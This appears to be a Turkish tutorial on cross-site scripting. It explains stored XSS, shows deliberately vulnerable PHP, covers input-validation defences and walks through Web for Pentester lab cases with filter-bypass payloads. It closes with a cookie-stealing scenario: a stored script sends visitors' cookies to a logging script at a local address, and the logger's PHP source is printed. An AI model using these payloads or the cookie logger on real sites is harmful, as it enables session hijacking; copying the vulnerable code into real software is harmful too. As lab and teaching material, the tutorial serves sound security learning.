<p>Kullanıcıdan alınan verinin yeterli filtrelemeden geçmemesi sonucunda veri tabanına kayıt edildikten sonra kayıt edilen bu veri başka bir yerde kullanılmak üzere veri tabanından çekileceği sırada ortaya çıkan bir xss zafiyet türüdür. Diğer türlerine oranla çok daha tehlikelidir. Çünkü bu xss zafiyet türünde zararlı kod veri tabanına kayıt edilir. Bu da şu anlama gelmektedir; Sisteme kayıtlı olan kullanıcılar zafiyetten etkilenen sayfayı ziyaret ettikleri anda oturum bilgilerini farkında olmadan saldırgana kaptırırlar. Tehlikeli olan nokta tam da burası işte. Saldırganın kimseyle muhattap olmaması... Diğer xss türlerinde saldırgan, kullanıcılara ilgili bağlantıya bir şekilde istek yaptırtmaya çalışır ama burada böyle bir durum söz konusu değildir. Payloadın kendisi sitenin veri tabanında kayıtlı zaten. Sadece payloadın select edileceği sayfayı kullanıcın ziyaret etmesi yeterli. Bu durumda sadece bir kişi veya bir grup değil sistemde kayıtlı olan herkes zafiyetten etkilenmiş olur. Diğer xss türlerinde fazla detaya girdiğimiz için bu türün teknik olarak diğerlerinden çok bir farkı bulunmamakta. Sadece bu sefer işin içinde veri tabanı girmektedir. Bu da saldırının kapsamını ve tehlikesini ciddi anlamda büyütmektedir. </p>
<p>Kullanıcıların yorum yaptığı bir sistem düşünelim. Ve back-end kısmında şöyle bir kod yazılmış olsun.</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="c1">#yorumlar.php sayfası. Kullanıcıların yorum yazması veya yazılan yorumları okuması için kodlandı.</span>
<span class="c1">#veri tabanı bağlantısı ve seçimi vs. yapıldı...</span>

<span class="nv">$mesaj</span>   <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'mesaj'</span><span class="p">];</span>
<span class="nv">$user</span>    <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'user'</span><span class="p">];</span>
<span class="nv">$ekle</span>    <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="nx">yorumlar</span> <span class="p">(</span><span class="nx">user</span><span class="p">,</span> <span class="nx">mesaj</span><span class="p">)</span> <span class="nx">VALUES</span><span class="p">(</span><span class="s1">'$user'</span><span class="p">,</span> <span class="s1">'$mesaj'</span><span class="p">));</span> 

<span class="nv">$q</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">yorumlar</span><span class="p">);</span>
<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$q</span><span class="p">))</span> <span class="p">{</span>
<span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span><span class="o">.</span><span class="s2">" - "</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'mesaj'</span><span class="p">];</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>Eminim yukarıdaki kodu yazacak junior developerlar bile yoktur artık. Ancak amacım basit bir örnek ile mantığını anlatmak olduğundan böyle bir kod yazdım. Yukarıdaki kodda mysql database ile işlem yaptık ama diğer databaselerde de yukarıdakine benzer fonksiyonlar ile işlem yaptırırsanız durum değişmeyecektir yine. İsterseniz php'deki oracle database ile işlem yapmak için kullanılan <code>oci_*</code> fonksiyonlarını kullanın bir şey değişmeyecektir. Bu gibi düz database işlemleri yaparsanız çok büyük ihtimmale zafiyet bırakırsınız ki php'de zaten artık bu fonksiyonları tavsiye etmiyor ve kullanıcılarının ya mysqli yada pdo kullanmaya zorluyor. Neyse konu fazla dağılmasın. Sonuç olarak kullanıcıdan gelen veriyi temizlemeden doğrudan sql sorgusuna sokulması hem sqli hemde xss zafiyetine sebeb olmaktadır. Yukarıda olan durumda tam olarak bu. Php için PDO sınıfını kullanırsanız filtrelemeler ile uğraşmanıza gerek kalmaz. PDO sınıfı, php ile veritabanı arasında güvenli bir şekilde veri alışverişi yapmak ve diğer veri tabanları desteği sayesinde oldukça kolaylık sağlamaktadır veya orm kullanabilirsiniz. Örnek senaryo bölümünde bu zafiyet türü kullanıldığı için gerekli detayı videoda izleyebilirsiniz.<br/>
<br/></p>
<h3 id="xss-zafiyetinin-cozumu"><strong>XSS Zafiyetinin Çözümü</strong></h3>
<p>Şimdiye kadar hep bir saldırganın gözüyle sisteme baktık ama bu başlıkta bir devoloper olarak duruma yaklaşacağız ve geliştireceğimiz uygulamalarda xss zafiyeti bırakmamak için bazı ipuçları vereceğiz.</p>
<h4 id="girdi-kontrolleri"><strong>Girdi Kontrolleri</strong></h4>
<p>Zafiyete, kullanıcının müdahale edebildiği alanlar veya kullanıcıdan alınan veriler sebeb olduğu için çözümü de burada arayacağız. Girdi denetiminleri çok sıkı sıkıya yapıldığı taktirde bu zafiyet ortaya çıkmayacaktır. Şimdi bu denetimlerde kullanılan kabul görmüş çözüm tekniklerine göz atalım.<br/>
<br/></p>
<h5 id="white-list-teknigi"><strong>White List Tekniği</strong></h5>
<p>Pozitif girdi denetimi olarakta bilinen bu çözüm metodunda kullanıcıdan gelecek olan verilerin(karakterlerin, kelimelerin vs) hangilerine izin verileceği belirtilir. Örnek vermek gerekirse kullanıcıdan sadece alfanumeric değerler  alıyor isek  (yani A'dan Z'ye ve 0'dan 9'a) bunu regex ile ifade ederek sadece kabul edeceğimiz verileri belirleriz. Bu durumda kullanıcıdan gelecek olan özel karakterlerin bütününü kabul etmemiş oluruz. Başka bir örnek daha verecek olursak kullanıcıdan aldığımız değerler sadece belli kelimeler veya ifadelerden ibaret ise sadece kabul edebileceklerimizi belirler, belirlediğimiz değerler dışında gelen değerleri işleme almayız.<br/>
<br/></p>
<h5 id="black-list-teknigi"><strong>Black List Tekniği</strong></h5>
<p>Bu teknikte ise white list'in aksine kullanıcıdan gelen veriler arasında kabul etmediklerimizi belirleriz. White list gibi sağlam görünse de aslında hiç öyle değildir. Bu çözüm tekniğinde olasılıklar çok fazla ve bir tanesinin bile gözünüzden kaçması zafiyete sebeb olmaktadır. <code>&lt; , ' , &gt; , "</code> karakterlerini engellediğinizde bunların hex formatını da engelleyeceksiniz encode edilmiş hallini de engelleyeceksiniz yazılan koda göre değişiklik göstermekle beraber bazen bu karakterler kullanılmadan da zafiyet oluşabilmektedir. Bu durumda script kelimesini engellemelisiniz, alert, prompt, confirm, hex formatları, char formatları vs vs külfetten başka bir şey değil gördüğünüz gibi olasılıklar çok fazla çünkü.<br/>
<br/></p>
<h5 id="sanitize"><strong>Sanitize</strong></h5>
<p>Sanitize yönteminde kullanıcıdan gelen veri arıtılır/temizlenir. Kullanıcıdan gelen veriler arasında yasaklı karakterler(black list)/izin verilmeyen karakterler(white list) bulunmasına rağmen bunu işleme almamak yerine veri içerisindeki zararlı/istenmeyen karakterler veriden çıkarılarak verinin temizlendikten sonra işleme alınması yöntemidir. Bu çözüm yoluda geliştirdiğiniz uygulamadada xss zafiyeti bırakma olasılığınızı çok çok düşürmektedir.<br/>
<br/></p>
<h5 id="encoding"><strong>Encoding</strong></h5>
<p>Gelen veri içerisindeki özel karakterlerin başka bir formata dönüştürülüp artık özel anlamını yitirmesi durumudur. Yukarıda dom-based xss türünde firefox tarayıcısının kullanıcılarını bu zafiyetten korumak için tam olarak yaptığı encoding işlemidir. Html ve url encoding web saldırılarından korunmak için en sık başvurulan kodlamalardandır. <code>&lt;, &gt;, ', "</code> gibi karakterleri encode işleminden geçirdiğinizde bazı web tabanlı saldırılarından(sqli, xss, code inj.) korunmak için kayda değer bir önlem almış olursunuz, ama tabiki tek başına bu çözüm yeterli değildir.    </p>
<p>Geliştireceğiniz uygulamada yukarıda sunulan çözüm stratejilerinden birkaçını beraber kullanırsanız bu zafiyete mahal vermemiş olursunuz. Girdiyi birkaç aşamadan geçirdiğinizde güvenliği artırmış olursunuz. Yani önce white ve black list yöntemi ile girdiyi temizle sonra encoding uygula en sonunda veriyi işleme al.</p>
<div class="highlight"><pre><span></span>Güvenlik camiasındaki şu meşhur sözü duymuşsunuzdur; En zayıf halkanız kadar güvendesinizdir. Güvenlik bir bütün olarak ele alınmalıdır. Sisteminizi parçalara ayırıp her parçanın güvenliğini ayrı ayrı sağladığınız takdir de parçaların oluşturduğu bütün güvenli sayılır. Aksi halde tek bir parçadan kaynaklanan zafiyet bütün sistemi riske atmaktadır.
</pre></div>
<p><br/></p>
<h2 id="web-for-pentester"><strong>Web for Pentester</strong></h2>
<p>Bu teorik bilgilerimizi uygulamayabilmek için bir pentest lab ortamı kuracağız. Bunun için <a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso">bu linkte</a> bulunan iso dosyasını indirip wmware veya virtual box gibi sanallaştırma yazılımlarını kullanarak çalıştıracağız. Ve bu sanal makinenin ip adresini kendi tarayıcımıza yazdığımızda aşağıdaki ekranla karşılaşırsak nema problema.  Googledan <code>web for pentester</code> diye aratırsanız sayfalarca sonuç çıkacaktır.
<img alt="web-for-pentester" src="img/web-for-pentester-index.jpg"/> </p>
<div class="highlight"><pre><span></span>Xss zafiyeti araken körü körüne random payloadlar yazmak yerine, ilgili parametreye doğrudan bütün özel karakterleri (&lt;,',&lt;,") yazıp hangilerinin filtrelendiğini görebiliriz, ve buna dayanarak daha makul ve yerinde payladlar yazarak zamandan tasaruf edebiliriz.
</pre></div>
<p><em>Şimdi XSS kategorisindeki caseleri çözmeye başlayalım.</em> </p>
<h4 id="example-1"><strong>Example 1</strong></h4>
<p>Url'de <code>http://192.168.46.128/xss/example1.php?name=</code> gördüğünüz üzere example1.php dosyası, get metodu ile name parametresine aldığı değeri ekrana basılıyor. Yukarıdaki trickte bahsettiğimiz gibi özel karakterlerimizi yazarak sayfanın kaynak kodunda oluşan değişimi gözlemleyip ona göre payload geliştirelim.<br/>
<img alt="xss-case1-html-source-code" src="/img/xss-case1-html-source-code.jpg"/> </p>
<p>Gördüğünüz üzere en ufak bi filtreleme yok. Yazdığımız bütün karakterler ekrana yansıdı. İlk örnek olduğu için en temel xss payloadımız olan <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>yazalım.<br/>
<img alt="xss-case1-alert" src="/img/xss-case1-alert.jpg"/> </p>
<p>Alerti başarılı bir şekilde aldık. Şimdi kaynak koduna bakıp 2. Örneğe geçelim.<br/>
<img alt="xss-case1-source-code" src="/img/xss-case1-source-code.jpg"/> <br> </br></p>
<p>Kaynak koddan gördüğünüz gibi kullanıcıdan gelen veri hiç süzülmeden doğrudan ekrana basılmaktadır. Bundan daha büyük hata olabilir mi?  </p>
<p><br/></p>
<h4 id="example-2"><strong>Example 2</strong></h4>
<p>Url yapısı ilk casemiz ile aynı. Ancak ilk örnekte kullandığımız payloadı burda denediğimizde text olarak <code>“Hello alert(1)”</code> çıktısını alıyoruz.<br/>
<img alt="xss-case2-html-source-code" src="/img/xss-case2-html-source-code.jpg"/> </p>
<p>Burda olan işlemden şu sonucu çıkarabiliriz; yazdığımız javascript kodu çalışmadı. Çünkü ekranda alert(1) ifadesi text olarak göründü bunun anlamı ise geliştirici script keywordunü filtrelemiş. Peki bunu nasıl bypass ederiz? 
En temel şekilde büyük-küçük yazarız.<br/>
Payloadımız: <code>&lt;ScRipt&gt;alert(1)&lt;/sCriPT&gt;</code> <br/>
<img alt="xss-case2-source-code" src="/img/xss-case2-source-code.jpg"/> </p>
<p>Kaynak kodu incelediğimizde, get metoduyla name parametresine verilen değer name değişkenine atanmıştır ve <code>preg_replace()</code> fonksiyonu sayesinde name değişkeninde eğer <code>&lt;script&gt;</code> veya <code>&lt;/script&gt;</code> kelimeleri geçiyor ise bunları silmektedir/değiştirmektedir.</p>
<p><br/></p>
<h4 id="example-3"><strong>Example 3</strong></h4>
<p>Url adresimizdeki name parametresi dikkatimizi çekmiş olmalı. Özel karakterlerimizi kullanıp herhangi bir filtrelenme var mı diye kontrol edelim. Sayfanın kaynak koduna baktığımızda özel karakterlerimizin filtrelenmediğini görürüz. Ve sazan gibi en temel payloadımız olan <code>&lt;script&gt;alert(1) &lt;/script&gt;</code> yazıyoruz. Hopaaa! Script keywordu engellenmiş :/<br/>
<img alt="xss-case3-html-source-code" src="/img/xss-case3-html-source-code.jpg"/> </p>
<p>script keywordunu büyük-küçük yazmamıza rağmen işe yaramayacaktır. O zaman ne yapabiliriz? Okumayı burda bırakıp biraz düşünün :)<br/>
Cevap, iç içe yazmak. Yani <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code> . Bu payload arkada nasıl işleyecek peki? Name parametesine yazacağımız payloadlarda geçen <code>&lt;script&gt;</code> keywordlerini sileceği için geriye yine <code>&lt;script&gt;</code> keywordu kalacaktır. Ve payloadımız başarıyla çalışacaktır.<br/>
<img alt="xss-case3-alert" src="/img/xss-case3-alert.jpg"/> </p>
<p>Yani uzun lafın kısası payloadımız: <code>&lt;scri&lt;script&gt;pt&gt;alert(1)&lt;/scri&lt;/script&gt;pt&gt;</code> <br/>
<img alt="xss-case3-source-code" src="/img/xss-case3-source-code.jpg"/> </p>
<p>Kaynak kodu incelediğimizde gördüğümüz gibi script kelimesi temizleniyor.  </p>
<div class="highlight"><pre><span></span>Regex de /i ifadesi büyük-küçük harflere karşı duyarsızlığı ifade ediyor. Yani siz aLeRt veya alert de yazsanız farketmeyecek ikisinide engelleyecektir.
</pre></div>
<p><br/></p>
<h4 id="example-4"><strong>Example 4</strong></h4>
<p>Örnek4 de ise şimdiye kadar denediğimiz 3 payloadın bu örnekte çalışmadığını göreceğiz. Payloadlarımızı yazıp html kaynak kodlarına baktığımızda aşağıda bulunan resimdeki gibi bir sonuç aldığımızı görüyoruz. Sayfanın kaynak koduna baktığımızda sadece “error” ibaresini göreceğiz. Büyük olasılıkla geliştirici name parametresine verilen değerde script veya alert gibi özel kelimeleri filtrelemiştir. Ve bu kelimeler kullanıldıldığı taktirde die() veya error() gibi fonksiyonlarla çalışan betiği sonlandırır. Bu noktada bizim yazacağımız kod bu kelime(ler)i içermeyen bir payload yazmaktır. Bunu da html taglarındaki attributleri kullanarak yapacağız. Yani bir html etiketinin atributtune js kodu yazacağız. Örneğin şöyle; <code>&lt;img src=x onerror=alert(1)&gt;</code> gördüğünüz üzere hiç script kelimesini kullanmadık. Bu payloadda src adında bir imaj yüklemeye çalıştık eğer yükleyemez, bir hata meydana gelir ise onerror attributune vereceğimiz alert ile ekrana 1 yazacak. Payloadımızı denediğimizde çalışacağını göreceğiz. Alternatif olarak <code>&lt;svg src=x onerror=alert(1)&gt;</code> çalışacaktır hatta benzer yapıya sahip başka html etiketleri de çalışacaktır.<br/>
<img alt="xss-case4-html-source-code" src="/img/xss-case4-html-source-code.jpg"/> </p>
<p>Sayfanın kaynak koduna bakıldığında payloadımızın html syntaxına uygun olduğu görülecektir. Bundan dolayı sorunsuz bir şekilde çalıştı. Yazacağımız bütün payloadlarda bunu dikkate almalıyız. İlgili dilin syntaxına uygun olarak yazılacak ki payload çalışabilsin.<br/>
<img alt="xss-case4-source-code" src="/img/xss-case4-source-code.jpg"/> </p>
<p>Şimdi kaynak kodu inceleyelim. Evet gördüğünüz gibi aynen düşündüğümüz gibi Regex ifadesi kullanılarak script kelimesinin name parametresine verilmesi durumunda die komutu ile sayfanın geri kalanını çalıştırmayacak şekilde error verdirilmiş.  </p>
<p><br/></p>
<h4 id="example-5"><strong>Example 5</strong></h4>
<p>Artık tahmin edeceğiniz gibi bir sonraki örnekte şimdiye kadar denediğimiz hiçbir payload çalışmayacaktır.  Normal bir payload yazdığımızda önceki örnekte olduğu gibi error ifadesini ekrana basıyor. Muhtemelen yine özel keywordlerden biri engellenmiştir. Şu ana kadar hep <code>alert()</code> ile ekrana birşeyler basmaya çalıştık ama tek kod bu değil. Benim bildiğim 2 komut daha var. Birincisi ekrana hem alert gibi pencere açıp aynı zamanda kullanıcıdan girdi alan <code>prompt()</code>, bir de kullanıcıdan onay isteyen <code>confirm()</code> kodu. Bunlar dışında başka popup boxlar da olabilir, benim bildiğim bu üçü. O zaman bu durumda payloadımız nasıl olacak?<br/>
<code>&lt;script&gt;prompt(1)&lt;/script&gt;</code> veya <code>&lt;script&gt;confirm(1)&lt;/script&gt;</code> her iki payload da sorunsuz çalışacaktır.<br/>
<img alt="xss-case5-alert" src="/img/xss-case5-alert.jpg"/> </p>
<p>Ctrl+u ile sayfanın kaynak kodlarına bakalım. Aşağıda gördüğünüz üzere yazdığımız payload script tagleri arasında ilgili yere yazılmış. Burda önemli olan nokta yazdığımız payload javascript syntaxını bozmadan yazılmış olmasıdır. Zaten syntaxı bozarsanız payloadınız çalışmayacaktır. Bu nedenle xss ararken deneme amaçlı yazdığınız payloadları sayfanın kaynak kodundaki değişimlerden takip ederek daha isabetli atışlar yapabilirsinizi.  <br/>
<img alt="xss-case5-html-source-code" src="/img/xss-case6-html-source-code.jpg"/> </p>
<p>Şimdi php tarafındaki kaynak kodları görelim;<br/>
<img alt="xss-case5-source-code" src="/img/xss-case5-source-code.jpg"/><br/>
<code>preg_match()</code> fonksiyonunun yaptığı şudur; Eğer birinci parametredeki değer, ikinci parametredeki veri içerisinde geçiyor ise true döner, geçmiyor ise false döner. Bu örnekte ilk parametremiz alert kelimesi oluyor ve \i ifadesinden dolayı (harf duyarlılığı olmaksızın) alert kelimesinin, get metoduyla alınan name parametresindeki değer içerisinde geçmesi durumunda fonksiyonumuz true dönecektir.  </p>
<p><br/></p>
<h4 id="example-6"><strong>Example 6</strong></h4>
<p>Öncellikle name parametresine “&lt;’&gt; şu 4 özel karakteri girelim bakalım ne olacak. Sayfanın kaynak kodundan anlaşılacağı üzere herhangi bir karakter filtrelenmesi söz konusu değil. Ctrl+u yaparak kaynak koda baktığımızda name parametresine girdiğimiz her değer script tagleri arasında bulunan a değişkenine atanıyor.<br/>
<img alt="xss-case6-html-source-code" src="/img/xss-case6-html-source-code.jpg"/> </p>
<p>Bu durumda nasıl bir payload geliştirebiliriz? Düşünelim biraz…
Öncellikle açılmış olan script tagini kapatalım. Daha sonra kendimiz bir script tagi açıp alert ile ekrana uyarıyı bastıktan sonra tagi kapatalım. Bazılarınız kapatmaya gerek yok zaten kendisi kapatmış diyebilir haklı olaraktan ancak sayfanın kaynak koduna baktığınızda “ ve ; işaretleri bize sorun oluşturacağından dolayı kendimiz kapatmamız gerekecektir. Uzun lafın kısası payloadımız;<br/>
<code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> şeklinde olacaktır.
<img alt="xss-case6-alert" src="/img/xss-case6-alert.jpg"/> </p>
<p>Bu örneğin kaynak koduna bakmaya gerek yok çünkü herhangi server side (php) tarafından bir filtreleme uygulanmamıştır. Sadece js kullanılmıştır. Sayfanın kaynak koduna bakıp ne tür bir filtreleme kullanıldığını görebilirsiniz.  </p>
<p><br/></p>
<h4 id="example7"><strong>Example7</strong></h4>
<p>Sıra geldi 7. Örneğimize bu örnek extrem bir örnek olabilir.  Bu örneğimizde diğerlerinden farklı olarak önce kaynak koduna bakıp ona göre payload geliştireceğiz. Bu noktada; E biz nerden bilelim sitenin kaynak kodlarını diyebilirsiniz? (Demeyin!) Şöyle bir durum var. Bir çok açık kaynak template, hazır scriptler, cms ler var. Eğer hedefimiz bu public olan bir sistem/script kullanıyorsa o zaman kaynak kodlarını indirip inceleyip ona göre payload geliştirebilirsiniz. Durum böyle olduğu için sadece tek bir sitede değil ilgili scripti kullanan her sitede payloadınız çalışacaktır.<br/>
<img alt="xss-case7-source-code" src="/img/xss-case7-source-code.jpg"/> </p>
<div class="highlight"><pre><span></span>Php de güvenlik adına çok önemli olan fonksiyonlardan biri de htmlentities() fonksiyonudur. Bu fonksiyon kendisine verilen her değerin içinde bulunan (&lt;, ", &gt;) ifadelerini sırasıyla (&amp;lt; , &amp;quot; , &amp;gt;) ifadelerine dönüştürür. Hatta 2. parametre olarak ENT_QUOTES değerini verirseniz ‘ (tek tırnağı da) engellemiş olursunuz. Tek tırnak ise &amp;#039; formatına dönüşür. Yani htmlentities($str, ENT_QUOTES) şeklinde kullanırsanız (&lt;, ', ", &gt;) bu 4 karakteri encoding ettiğinizden artık özel anlamlarını yitireceğinden bu karakterleri barındıran zararlı kodlar çalışmayacaktır. Bu saldırganın işini çok ama çok zorlaştırır. XSS ile veri aldığımız inputlardaki değeri bu fonksiyondan geçirirsek çok büyük bir olasılıkla xss saldırısından korunmuş olacağız. Bu nedenle bu fonksiyon geliştiriciler için bi’ nimettir. Ancak bazı nadir vardır ki bu fonksiyon kullanılmasına rağman xss zaafiyeti meydana yine meydana gelmektedir. Sıradaki örneğimizde işte bu nadir olan durumlardan birini göreceğiz.
</pre></div>
<p>Şimdi bu kadar bilgiyi neden paylaştım? Çünkü sıradaki challangemızda inputtan alınan değer bu fonksiyondan geçmiştir. Ancak tek tırnağı da engellemek için opsiyonel olarak 2. Parametre de alabileceğini söylemiştik bu challangemızda 2. Parametre belirtilmemiştir. Bu da şu anlama gelmektedir; ‘ tırnak kullanabiliriz. Ve bir çok geliştirici bu fonksiyonu kullandığı zaman 2. Parametreyi belirtmez bu da saldırganın işini çok kolaylaştırmaktadır. Asıl mevzumuza gelelim şimdi.  Name parametresine özel karakterlerimizi girip sayfanın kaynak koduna bakıp meydana gelen değişimi gözlemleyelim.<br/>
<img alt="xss-case7-html-source-code" src="/img/xss-case7-html-source-code.jpg"/> </p>
<p>Gördüğünüz gibi sırasıyla &lt; ,  &gt; , “ karakterlerimiz; <code>&amp;alt;</code> , <code>&amp;gt;</code> , <code>&amp;quot;</code> karakterlerine dönüştürülerek güvenlik sağlanmaya çalışılmış AMA dikkat ettiyseniz ‘(tek tırnak) karakteri olduğu gibi kaldı. Bu bizim için çok önemli! Bir diğer önemli olan nokta ise; name parametresine yazdığımız değerin zaten <code>&lt;script&gt;</code> tagleri arasında işlenecek olmasıdır. Böylelikle &lt;, &gt; karakterlerini kullanmamıza gerek kalmayacak. Öte yandan sayfanın kaynak koduna baktığımızda yazdığımız değerin JS kısmında a diye bir değişkende ‘(tek tırnaklar) arasında tutulduğunu göreceğiz. Şimdi şöyle düşünelim ekrana alert vermek için öncellikle js tarafında olan a değişkeninin alacağı değerin ‘ işaretini kapatalım. Daha sonra ;(noktalı virgül) karakterimizi yazarak ilgili kod satırını sonlandıralım. Şimdi alert ifademizi yazabiliriz. Zaten JS kodunda önceden var olan sondaki ‘ işaretinden kaçmak içinde <code>//</code> karakterlerini kullanarak pasif ediyor. Yani şöyle bir şey oldu; 
Payload:<code>musana’;alert(1)//</code><br/>
<img alt="xss-case7-alert" src="/img/xss-case7-alert.jpg"/> </p>
<p>Zaten payloadımızı js de ilgili yere yazdığımızda herhangi bir syntax hatasının olmadığını göreceğiz.
<img alt="xss-case7-html-source-code2" src="/img/xss-case7-html-source-code2.jpg"/> </p>
<p>Bir sonraki örneğimizde bizi bir input karşılıyor ancak bizim input ile işimiz olmayacak. Sayfanın kaynak kodlarına baktığımızda form etikemizin action niteliğinde sayfamızın olduğunu göreceğiz. Bu nedenle sayfamızın url yapısını mıncıklayacağız biraz. Çünkü url kısmına ne yazılır ise form etiketnin action niteliğinin değeri olarak atanıyor. O halde aşağıdaki payload çalışacaktır.<br/>
<code>/" onmouseover="alert(1)</code><br/>
/” ile action niteliğimizin değerini kapadık. Daha sonra onmouseover adında bir js eventı tanımladık ancak payloadın sonuna “(çift tırnak) atmadık çünkü tırnağı kendisi tamamlayacak.<br/>
<img alt="xss-case8-html-source-code" src="/img/xss-case8-html-source-code.jpg"/> </p>
<p>Kaynak koda baktığımızda payloadımızın cuk diye oturduğunu görüyoruz zaten.
Aşağıdaki resimde ise php kaynak kodlarını görüyoruz. Htmlentities fonksiyonu kullanılarak input’tan gelen zararlı karakterler filtrelenmiş. Ancak form etiketinin action niteliğinde <code>PHP_SELF</code> kullanılmış. Yani formdan gönderilecek herhangi bir very aynı sayfada işlenecek. Bizde tam olarak bu kısmı kullanarak payload geliştirdik.<br/>
<img alt="xss-case8-source-code" src="/img/xss-case8-source-code.jpg"/> </p>
<p><br/></p>
<h4 id="bonussiz-cozun"><strong>BONUS(Siz Çözün):</strong></h4>
<p>Şimdiye kadar gördüğümüz örnek caselere dayanarak bu örneği çözmenizi bekliyorum. Çünkü yukarıdakileri okuyup anladıysanız biraz kafa yorarak rahatlıkla zafiyeti ortaya çıkaracak payloadı yazabilirsiniz. Payloadları yorum kısmına bekliyorum :)  </p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> 

<span class="nv">$request</span>    <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'istek'</span><span class="p">];</span>
<span class="nv">$filtrele</span>   <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'&lt;'</span><span class="p">,</span> <span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'"'</span><span class="p">);</span>
<span class="c1"># htmlentities() fonksiyonunun default kullanımı</span>
<span class="c1"># 3. ve 4. satırdaki işlemleri icra eder.</span>
<span class="nv">$request</span>    <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="nv">$filtrele</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$request</span><span class="p">);</span>

<span class="cp">?&gt;</span><span class="x"></span>

<span class="x">&lt;!DOCTYPE html&gt;</span>
<span class="x">&lt;html lang="tr"&gt;</span>
<span class="x">&lt;head&gt;</span>
<span class="x">    &lt;meta charset="UTF-8"&gt;</span>
<span class="x">    &lt;title&gt;XSS&lt;/title&gt;</span>
<span class="x">&lt;/head&gt;</span>
<span class="x">&lt;body&gt;</span>
<span class="x">    &lt;script&gt;</span>
<span class="x">        var value;</span>
<span class="x">        function setValue(){</span>
<span class="x">            if(false){</span>
<span class="x">                value = </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$request</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">            }</span>
<span class="x">        }</span>
<span class="x">    &lt;/script&gt;</span>
<span class="x">&lt;/body&gt;</span>
<span class="x">&lt;/html&gt;</span>
</pre></div>
<p><br/></p>
<h2 id="ornek-bir-senaryo"><strong>Örnek bir senaryo</strong></h2>
<p>Şimdiye kadar gördülerimiz ile bir sistemde olan xss zafiyetini ortaya çıkarmak için ne tür/nasıl payloadlar geliştireceğimizi gördük. Peki iyi güzel de bir sitede xss zafiyetinin olması neyi ifade ediyor tam anlamıyla? Neden bu kadar tehlikeli? Bug bounty programlarında neden para veriliyor bu zafiyete? Saldırganlar bu zafiyeti nasıl istismar ediyor? Şimdi bu sorulara uygulamalı cevap verme zamanı. Örnek bir site üzerinde bulacağımız bir xss zafiyeti ile kullanıcın oturum bilgilerinin nasıl ele geçirileceğini göreceğiz.<br/>
Oracle ve php ile CRUD(Create, Read, Update, Delete) işlemlerini yapan basit bir web uygulaması yazmıştım zamanında örnek senaryamozu bu uygulama üzerinde anlatacağım. Scripti <a href="https://github.com/musana">buradan</a> indirebilirsiniz. (Scriptin çalışması için oracle express edition programını kurmanız gerekmektedir.)  </p>
<p>Burdan sonrasını video ile anlatmak daha iyi olacak sanırım. Yazı zaten yeterince uzun ne siz sıkılın ne ben yorulayım :)</p>
<p>Videoda herşeyi açık bir şekilde göstermeye çalıştım. Aklınıza takılan bir yer olursa veya scripti çalıştırmada sorun yaşarsanız yorum bölümüne yazmanız yeterli.  </p>
<div class="youtube-video">
<iframe allowfullscreen="" frameborder="0" height="480" src="https://www.youtube.com/embed/wFP9nRVhkBU" width="880"></iframe>
</div>
<p>Videoda tam olarak ne yaptığımı açık bir şekilde yazmaya çalıştım. Kullandığım kodları paylaşıp kısa bir özet geçtikten bu bölümü sonlandıracağım.</p>
<p>Öncellikle hedef sistemin kayıt ol sisteminde stored xss zafiyeti bulduk ve istismar etmek için kayıt ol inputlarından birine aşağıdaki payloadı yazdık. Payloadımız veri tabanına kayıt edildiği için giriş yapan herkes oturum bilgileri ile beraber bizim istediğimiz adrese yönlendirilecekti.</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;script&gt;</span>location.href="http://127.0.0.1/session_log/snif.php?x="+document_cookie+"\n"<span class="nt">&lt;/script&gt;</span>
</pre></div>
<p><code>snif.php</code> dosyamızı da paylaşalım. Sadece gelen <code>x</code> parametresindeki değeri <code>log.txt</code> dosyasına yazıyor, that's that.</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'x'</span><span class="p">];</span> <span class="c1">// get metoduyla x parametresinin değerini cookie değişkenine atatık.</span>
<span class="nv">$f</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"log.txt"</span><span class="p">,</span><span class="s2">"a"</span><span class="p">);</span> <span class="c1">// log.txt adında bir metin belgesini a izniyle açtık. a: yoksa oluştur, varsa sonuna ekle.</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$cookie</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span> <span class="c1">// log.txt dosyamıza cookie değerlerini yazıyoruz.</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> <span class="c1">// Dosyamızı kapattık.</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
